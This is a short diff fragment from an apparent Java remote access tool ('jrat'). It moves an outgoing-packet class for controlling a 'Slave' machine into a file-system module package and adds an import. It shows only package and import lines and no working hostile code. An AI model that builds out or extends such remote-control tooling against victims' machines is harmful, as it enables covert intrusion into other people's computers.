@@ -1,6 +1,7 @@
-package jrat.controller.packets.outgoing;
+package jrat.module.fs.packets;
 
 import jrat.controller.Slave;
+import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 
 import java.io.DataOutputStream;
 
